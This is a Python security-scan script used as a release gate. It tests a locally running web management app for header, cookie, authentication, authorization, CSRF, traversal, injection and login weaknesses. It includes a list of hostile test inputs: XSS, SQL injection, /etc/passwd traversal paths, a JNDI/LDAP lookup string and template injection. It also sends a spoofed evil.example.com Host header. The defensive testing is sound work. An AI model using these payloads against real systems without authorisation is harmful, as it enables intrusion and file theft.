#!/usr/bin/env python3
"""Release gate: black-box security checks against a running instance (the synthetic environment of
tools/e2e/run.sh). Standard library only; no download. It complements, not replaces, a DAST scanner (ZAP).

  tools/security_scan.py <e2e work dir>        (reads <dir>/port and <dir>/totp.json written by run.sh)

Checks (every API route is taken from the code itself, so a new route is covered automatically):
  headers     CSP without unsafe-inline / unsafe-eval, frame-ancestors none, nosniff, X-Frame-Options, Referrer-
              Policy, no-store on the API, no software version in Server
  cookies     session cookie HttpOnly + SameSite, never readable by scripts
  authn       every non-public route answers 401 without a session or token
  authz       a viewer gets 403 on operator/approver/admin routes; an API token never reaches admin routes,
              approving, settings, users or tokens; a token outside its source network is refused
  csrf        a state-changing request with a valid session but without the CSRF header is refused
  methods     TRACE / unknown methods refused; no HTTP method override
  traversal   static files and route parameters never serve a file outside the web root
  injection   hostile query strings / bodies on every GET route: no 5xx, no reflected markup in HTML, JSON
              answers stay JSON
  input       malformed JSON, wrong types and oversized bodies answer 4xx, never 5xx
  login       unknown user and wrong password give the same answer; lockout after repeated failures;
              no open redirect
Exit status 1 when any check fails; a JSON report is written next to the work dir (security-report.json).
"""
import base64
import hashlib
import hmac
import http.client
import json
import os
import struct
import sys
import time
import urllib.parse

HERE = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, os.path.dirname(HERE))

PW = 'Smoke-Passw0rd-1'
HOSTILE = ['<script>alert(1)</script>', '"><img src=x onerror=alert(1)>', "' OR '1'='1", '../../../../etc/passwd',
           '%2e%2e%2f%2e%2e%2fetc%2fpasswd', '${jndi:ldap://203.0.113.1/a}', '{{7*7}}', '\x00', 'A' * 5000,
           '1;DROP TABLE users--', '-1', '99999999999999999999', '[]', '{"a":1}']


class Scan:
    def __init__(self, workdir):
        self.port = int(open(os.path.join(workdir, 'port')).read().strip())
        self.secrets = json.load(open(os.path.join(workdir, 'totp.json')))
        self.workdir = workdir
        self.results = []
        self.fail_count = 0

    # --- plumbing ------------------------------------------------------------------------------
    def req(self, method, path, body=None, headers=None, sess=None, raw_body=None, host=None):
        c = http.client.HTTPConnection('127.0.0.1', self.port, timeout=30)
        h = {'Host': host or '127.0.0.1:%d' % self.port, 'Accept': 'application/json'}
        if sess:
            h['Cookie'] = sess['cookie']
            if method not in ('GET', 'HEAD') and sess.get('csrf'):
                h['X-CSRF-Token'] = sess['csrf']
            if sess.get('token'):
                h['Authorization'] = 'Bearer ' + sess['token']
                h.pop('Cookie', None)
        data = raw_body
        if body is not None:
            data = json.dumps(body).encode()
            h['Content-Type'] = 'application/json'
        h.update(headers or {})
        try:
            c.request(method, path, body=data, headers=h)
            r = c.getresponse()
            out = (r.status, {k.lower(): v for k, v in r.getheaders()}, r.read(2 * 1024 * 1024))
        finally:
            c.close()
        return out

    def check(self, group, name, ok, detail=''):
        self.results.append({'group': group, 'check': name, 'ok': bool(ok), 'detail': str(detail)[:300]})
        if not ok:
            self.fail_count += 1
            print('FAIL %-10s %s %s' % (group, name, str(detail)[:200]))

    @staticmethod
    def totp(secret):
        key = base64.b32decode(secret + '=' * (-len(secret) % 8))
        step = int(time.time() // 30)
        h = hmac.new(key, struct.pack('>Q', step), hashlib.sha1).digest()
        o = h[-1] & 15
        return '%06d' % ((struct.unpack('>I', h[o:o + 4])[0] & 0x7fffffff) % 1000000)

    def login(self, user):
        body = {'username': user, 'password': PW}
        if user in self.secrets:
            body['totp'] = self.totp(self.secrets[user])
        st, h, b = self.req('POST', '/api/v1/auth/login', body)
        if st != 200:
            raise SystemExit('cannot log in as %s: %s %s' % (user, st, b[:200]))
        cookie = h.get('set-cookie', '').split(';', 1)[0]
        return {'cookie': cookie, 'csrf': json.loads(b)['csrf_token'], 'set_cookie': h.get('set-cookie', '')}

    # --- the routes, from the code --------------------------------------------------------------
    @staticmethod
    def routes():
        from jtwafmgr.web import api
        from jtwafmgr.web.server import Router
        r = Router()
        api.register(r)
        out = []
        for method, rx, fn, perm in r.routes:
            path = rx.pattern[1:-1]
            path = __import__('re').sub(r'\(\?P<(\w+)>\[\^/\]\+\)', lambda m: {'ip': '203.0.113.9', 'placement': 'before',
                                                                               'version': '1', 'name': 'x'}.get(m.group(1), '1'), path)
            out.append((method, path.replace('\\', ''), fn.__name__, perm))
        return out

    # --- checks ---------------------------------------------------------------------------------
    def headers(self):
        for path in ('/', '/login', '/api/v1/auth/me', '/api/v1/no-such-route'):
            st, h, _ = self.req('GET', path)
            csp = h.get('content-security-policy', '')
            self.check('headers', 'CSP present ' + path, csp, csp)
            self.check('headers', 'CSP no unsafe ' + path, 'unsafe-inline' not in csp and 'unsafe-eval' not in csp, csp)
            self.check('headers', 'frame-ancestors none ' + path, "frame-ancestors 'none'" in csp, csp)
            self.check('headers', 'nosniff ' + path, h.get('x-content-type-options') == 'nosniff')
            self.check('headers', 'X-Frame-Options ' + path, h.get('x-frame-options') in ('DENY', 'SAMEORIGIN'))
            self.check('headers', 'Referrer-Policy ' + path, h.get('referrer-policy'))
            self.check('headers', 'no version in Server ' + path, not any(c.isdigit() for c in h.get('server', '')), h.get('server'))
            if path.startswith('/api/'):
                self.check('headers', 'API no-store ' + path, 'no-store' in h.get('cache-control', ''), h.get('cache-control'))

    def cookies(self, sess):
        sc = sess['set_cookie']
        self.check('cookies', 'HttpOnly', 'HttpOnly' in sc, sc)
        self.check('cookies', 'SameSite', 'SameSite=' in sc, sc)
        self.check('cookies', 'Path=/', 'Path=/' in sc, sc)

    def authn(self, routes):
        for method, path, name, perm in routes:
            if perm == 'public':
                continue
            st, _, _ = self.req(method, path, body={} if method != 'GET' else None)
            self.check('authn', '%s %s needs a login' % (method, path), st == 401, st)

    def authz(self, routes, viewer, token):
        rank = {'viewer': 1, 'operator': 2, 'approver': 3, 'admin': 4}
        for method, path, name, perm in routes:
            need = 'admin' if perm == ('admin',) else (perm[1] if isinstance(perm, tuple) and perm[0] == 'role' else None)
            if need and rank[need] > 1:
                st, _, _ = self.req(method, path, body={} if method != 'GET' else None, sess=viewer)
                self.check('authz', 'viewer refused %s %s' % (method, path), st in (403, 404), st)
            if perm == ('admin',) or (isinstance(perm, tuple) and perm[0] == 'role' and perm[2] is None) or perm == 'session':
                st, _, _ = self.req(method, path, body={} if method != 'GET' else None, sess=token)
                self.check('authz', 'token refused %s %s' % (method, path), st in (401, 403, 404), st)

    def csrf(self, admin):
        no_csrf = dict(admin, csrf='')
        for method, path in (('POST', '/api/v1/auth/logout'), ('PATCH', '/api/v1/auth/me'), ('POST', '/api/v1/system/check'),
                             ('PATCH', '/api/v1/settings/ui'), ('POST', '/api/v1/tokens')):
            st, _, _ = self.req(method, path, body={}, sess=no_csrf)
            self.check('csrf', '%s %s without CSRF header' % (method, path), st == 403, st)
        st, _, _ = self.req('POST', '/api/v1/system/check', body={}, sess=dict(admin, csrf='x' * 43))
        self.check('csrf', 'wrong CSRF token', st == 403, st)

    def methods(self, admin):
        for m in ('TRACE', 'TRACK', 'CONNECT', 'PROPFIND'):
            st, _, b = self.req(m, '/api/v1/auth/me', sess=admin)
            self.check('methods', m + ' refused', st in (400, 403, 404, 405, 501), st)
        st, _, _ = self.req('POST', '/api/v1/admin/users', sess=dict(admin, csrf=''), headers={'X-HTTP-Method-Override': 'GET'})
        self.check('methods', 'no method override', st in (403, 404, 405), st)

    def traversal(self, admin):
        for p in ('/../../../../etc/passwd', '/%2e%2e/%2e%2e/etc/passwd', '/assets/..%2f..%2f..%2fetc/passwd',
                  '/static/../../jtwafmgr/config.py', '/..%5c..%5cetc%5cpasswd', '/api/v1/rules/..%2f..%2fetc%2fpasswd',
                  '/api/v1/backups/..%2f..%2fetc%2fpasswd/verify', '/api/v1/managed/files/..%2fetc'):
            for sess in (None, admin):
                st, h, b = self.req('GET', p, sess=sess)
                self.check('traversal', p + (' (admin)' if sess else ''), b'root:' not in b and b'import ' not in b, st)

    def injection(self, routes, admin):
        for method, path, name, perm in routes:
            if method != 'GET':
                continue
            for i, v in enumerate(HOSTILE):
                q = urllib.parse.urlencode({'q': v, 'host': v, 'src_ip': v, 'since': v, 'limit': v, 'cursor': v, 'range': v})
                st, h, b = self.req('GET', path + '?' + q, sess=admin)
                self.check('injection', 'no 5xx %s #%d' % (path, i), st < 500, st)
                ct = h.get('content-type', '')
                if 'text/html' in ct:
                    self.check('injection', 'no reflection %s #%d' % (path, i), v.encode() not in b or '<' not in v)

    def input(self, routes, admin):
        for method, path, name, perm in routes:
            if method == 'GET' or path.endswith('/auth/logout'):
                continue
            for raw in (b'{', b'[]', b'"x"', b'{"a":' + b'1' * 100 + b'}', b'\xff\xfe', b'null'):
                st, _, _ = self.req(method, path, raw_body=raw, headers={'Content-Type': 'application/json'}, sess=admin)
                self.check('input', 'malformed body %s %s' % (method, path), st < 500, st)
        # the server refuses an oversized body: with a 400 / 413, or by closing the connection before the client has
        # sent it all (a broken pipe or reset on our side) -- either way the body was not taken in
        try:
            st, _, _ = self.req('POST', '/api/v1/auth/login', raw_body=b'{"a":"' + b'x' * (3 * 1024 * 1024) + b'"}',
                                headers={'Content-Type': 'application/json'})
        except (BrokenPipeError, ConnectionResetError):
            st = 'closed'
        self.check('input', 'oversized body refused', st in (400, 413, 'closed'), st)

    def login_checks(self):
        a = self.req('POST', '/api/v1/auth/login', {'username': 'no-such-user-x', 'password': 'wrong-password-1'})
        b = self.req('POST', '/api/v1/auth/login', {'username': 'oper', 'password': 'wrong-password-1'})
        ea = json.loads(a[2] or b'{}').get('error', {}).get('code')
        eb = json.loads(b[2] or b'{}').get('error', {}).get('code')
        self.check('login', 'same answer for unknown user and wrong password', (a[0], ea) == (b[0], eb), (a[0], ea, b[0], eb))
        codes = []
        for _ in range(12):
            codes.append(self.req('POST', '/api/v1/auth/login', {'username': 'lockme', 'password': 'wrong-password-1'})[0])
        st, _, body = self.req('POST', '/api/v1/auth/login', {'username': 'oper', 'password': 'wrong-password-1'})
        self.check('login', 'repeated failures throttled or locked', 429 in codes or st in (401, 423, 429), codes[-3:])
        st, h, _ = self.req('GET', '/login?next=https://203.0.113.1/')
        self.check('login', 'no open redirect', 'location' not in h or '203.0.113.1' not in h.get('location', ''), h.get('location'))
        st, h, b = self.req('GET', '/', host='evil.example.com')
        self.check('login', 'Host header not reflected in links', b'evil.example.com' not in b, st)

    def make_token(self, admin):
        st, _, b = self.req('POST', '/api/v1/tokens', {'name': 'secscan', 'scopes': ['events:read', 'changes:propose', 'changes:read'],
                                                       'allowed_cidrs': ['127.0.0.1/32'], 'expires_at': None}, sess=admin)
        if st not in (200, 201):
            self.check('authz', 'create test token', False, (st, b[:200]))
            return None
        tok = json.loads(b)['secret']
        st2, _, b2 = self.req('POST', '/api/v1/tokens', {'name': 'secscan-far', 'scopes': ['events:read'],
                                                         'allowed_cidrs': ['192.0.2.0/24'], 'expires_at': None}, sess=admin)
        if st2 in (200, 201):
            far = {'cookie': '', 'csrf': '', 'token': json.loads(b2)['secret']}
            st3, _, _ = self.req('GET', '/api/v1/events', sess=far)
            self.check('authz', 'token refused outside its source network', st3 in (401, 403), st3)
        st4, _, _ = self.req('GET', '/api/v1/events', sess={'cookie': '', 'csrf': '', 'token': tok})
        self.check('authz', 'token accepted inside its scope (control)', st4 == 200, st4)
        return {'cookie': '', 'csrf': '', 'token': tok}

    def run(self):
        routes = self.routes()
        self.login_checks()
        admin = self.login('admin')
        viewer = self.login('viewer')
        self.headers()
        self.cookies(admin)
        self.authn(routes)
        token = self.make_token(admin)
        if token:
            self.authz(routes, viewer, token)
        self.csrf(admin)
        self.methods(admin)
        self.traversal(admin)
        self.injection(routes, admin)
        self.input(routes, admin)
        groups = {}
        for r in self.results:
            g = groups.setdefault(r['group'], [0, 0])
            g[0 if r['ok'] else 1] += 1
        report = {'checks': len(self.results), 'failed': self.fail_count, 'groups': groups, 'results': self.results}
        with open(os.path.join(self.workdir, 'security-report.json'), 'w') as fh:
            json.dump(report, fh, indent=1)
        print('security scan: %s (%d checks, %d failed) %s' % ('OK' if not self.fail_count else 'FAILED', len(self.results),
                                                              self.fail_count, ' '.join('%s %d/%d' % (k, v[0], v[0] + v[1])
                                                                                        for k, v in groups.items())))
        return 1 if self.fail_count else 0


if __name__ == '__main__':
    sys.exit(Scan(sys.argv[1]).run())
